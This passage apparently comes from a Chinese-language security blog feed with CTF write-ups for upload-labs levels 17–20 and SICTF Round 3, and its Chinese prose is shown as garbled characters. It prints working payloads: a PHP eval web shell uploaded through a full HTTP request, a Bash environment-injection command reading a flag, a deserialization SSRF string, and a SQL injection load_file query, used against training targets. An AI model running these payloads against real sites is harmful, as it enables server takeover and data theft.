@eval($_POST[a]);?&gt;</code>,å¹¶ä¸”å†æ¬¡æ¸²æŸ“åpayloadä¾ç„¶å­˜åœ¨,ä½†æ˜¯åœ¨includeåå¹¶ä¸èƒ½è§£æ,ä¸çŸ¥é“ä»€ä¹ˆé—®é¢˜</p><h2 id="Pass-17-æ¡ä»¶ç«äº‰"><a href="#Pass-17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-17(æ¡ä»¶ç«äº‰)"></a>Pass-17(æ¡ä»¶ç«äº‰)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§è¿™é‡Œæ˜¯å…ˆæŠŠæ–‡ä»¶ä¿å­˜ä¸‹æ¥å†è¿›è¡Œåˆ¤æ–­, å› æ­¤å¯ä»¥è¿›è¡Œæ¡ä»¶ç«äº‰</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181755245.png" alt="image-20240222181755245"></p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240222181811015.png" alt="image-20240222181811015"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181820037.png" alt="image-20240222181820037"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>è¿™é‡Œä¸èƒ½å†ä½¿ç”¨phpæ–‡ä»¶äº†, å› ä¸ºæœåŠ¡å™¨ä¼šæ¯”å¯¹åç¼€ååå†å†³å®šæ˜¯å¦ä¿å­˜,</p><p>è¿™é‡Œç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153402676.png" alt="image-20240223153402676"></p><p>å¯ä»¥ç”¨ç”¨æ–‡ä»¶åŒ…å«æ¥æ¡ä»¶ç«äº‰æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153322537.png" alt="image-20240223153322537"></p><h2 id="Pass-19-move-uploaded-file-ç‰¹æ€§"><a href="#Pass-19-move-uploaded-file-ç‰¹æ€§" class="headerlink" title="Pass-19(move_uploaded_file()ç‰¹æ€§)"></a>Pass-19(move_uploaded_file()ç‰¹æ€§)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¾ç„¶æ˜¯é»‘åå•ç»•è¿‡, ä½†æ˜¯ä¿å­˜çš„æ–‡ä»¶åæ˜¯å¯æ§åˆ¶çš„</p><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªå‡½æ•°ç‰¹æ€§:</p><p>move_uploaded_file()ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ <code>/.</code></p><p>æ‰€ä»¥æ„é€ .php&#x2F;.æ¥ç»•è¿‡é»‘åå•, ç»è¿‡move_uploaded_file()ååˆå˜å›äº†.php</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154404013.png" alt="image-20240223154404013"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154416422.png" alt="image-20240223154416422"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>ä¸»è¦åœ¨äºè¿™ä¸¤å¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªéœ€è¦ä¼ å…¥æ•°ç»„å°±å¯ä»¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>reset()ä¼šè¿”å›æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼, count()è¿”å›æ•°ç»„ä¸­çš„å…ƒç´ ä¸ªæ•°</p><p>æˆ‘ä»¬åªéœ€è¦ä½¿å¾—reset($file)&#x3D;&#x3D;xxx.php; $file[count($file) - 1]&#x3D;&#x3D;ç©ºå€¼ å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªphpæ–‡ä»¶å</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155819310.png" alt="image-20240223155819310"></p><p>æ­¤æ—¶æ•°ç»„å†…æœ‰ä¸¤ä¸ªå…ƒç´ , è€Œ2-1&#x3D;1 ç´¢å¼•ä¸º1çš„å…ƒç´ å€¼ä¸ºç©ºå€¼</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155829766.png" alt="image-20240223155829766"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Upload-labs&quot;&gt;&lt;a href=&quot;#Upload-labs&quot; class=&quot;headerlink&quot; title=&quot;Upload-labs&quot;&gt;&lt;/a&gt;Upload-labs&lt;/h1&gt;&lt;p&gt;ç½‘ä¸Šæœ‰21å…³çš„å’Œ20å…³ä¸¤ç§,åœ¨è¿™é‡Œä»¥buu upload-labs </summary>
      
    
    
    
    <category term="é¶åœº" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SICTF-Round-3</title>
    <link href="http://example.com/2024/02/19/SICTF-Round-3/"/>
    <id>http://example.com/2024/02/19/SICTF-Round-3/</id>
    <published>2024-02-19T04:30:42.000Z</published>
    <updated>2024-02-19T04:34:50.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="100ï¼…-upload"><a href="#100ï¼…-upload" class="headerlink" title="100ï¼…_upload"></a>100ï¼…_upload</h2><p>é¦–å…ˆæ„é€ åç¼€å.php.</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.life:36177</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------291815788614695660121094840087</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://yuanshen.life:36177</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://yuanshen.life:36177/index.php?file=index.php</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">Upgrade-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upfile&quot;; filename=&quot;3.php.&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;?= @eval($_POST[<span class="string">&#x27;nacl&#x27;</span>]);?&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">æäº¤</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087--</span></span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æœ¨é©¬åç›´æ¥ç”¨ä»»æ„æ–‡ä»¶åŒ…å«æ¥è§¦å‘æœ¨é©¬</p><p>è¿™é‡Œä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112135730.png" alt="image-20240217112135730"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112200847.png" alt="image-20240217112200847"></p><h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:37269/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg;%20&#125;</span><br><span class="line"></span><br><span class="line">go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJ3b3JyaWVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p>å‚è€ƒ:</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Exploit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hint:hide other file</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">You don<span class="string">&#x27;t know how to pass parameters?</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥æ‰«å‡ºæ¥ä¸€ä¸ªadmin.php,æœ¬åœ°è®¿é—®admin.phpå¯ä»¥æ‹¿åˆ°flag</p><p>æ‰€ä»¥payloadä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38434/</span><br><span class="line">?Harder=O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:26:&quot;http://127.0.0.1/admin.php&quot;;s:7:&quot;payload&quot;;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">client</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>fuzzä¸€ä¸‹ä¼šå‘ç°ç¦äº†information_schema,or,andè¿™äº›</p><p>é¦–å…ˆå¯ä»¥load_fileè¯»å–æºç </p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;/**/union/**/select/**/load_file(&#x27;/var/www/html/index.php&#x27;)/**/%23</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--flagåœ¨flagè¡¨é‡Œ--&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$sensitive_keywords</span> = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;handler&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;-~&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;--+&quot;</span>, <span class="string">&quot;information&quot;</span>, <span class="string">&quot;xor&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;order&quot;</span>, <span class="string">&quot;floor&quot;</span>,<span class="string">&quot;sys_tables&quot;</span>,<span class="string">&quot;sys_columns&quot;</span>,<span class="string">&quot;sys.schema_table_statistics_with_buffer&quot;</span>,<span class="string">&quot;sys.schema_table_statistics&quot;</span>,<span class="string">&quot;mid&quot;</span>, <span class="string">&quot;ascii&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥å‚æ•°ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿå…³é”®è¯</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$sensitive_keywords</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$username</span>, <span class="variable">$keyword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœå‚æ•°ä¸­åŒ…å«æ•æ„Ÿå…³é”®è¯ï¼Œå¼¹çª—æç¤ºç”¨æˆ·</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;hacker&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="comment">// å¯ä»¥é€‰æ‹©ç»ˆæ­¢è„šæœ¬æ‰§è¡Œæˆ–è€…åšå…¶ä»–å¤„ç†</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id from flag where id=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// è¾“å‡ºæ¯ä¸€è¡Œè®°å½•çš„ love å­—æ®µå€¼</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span 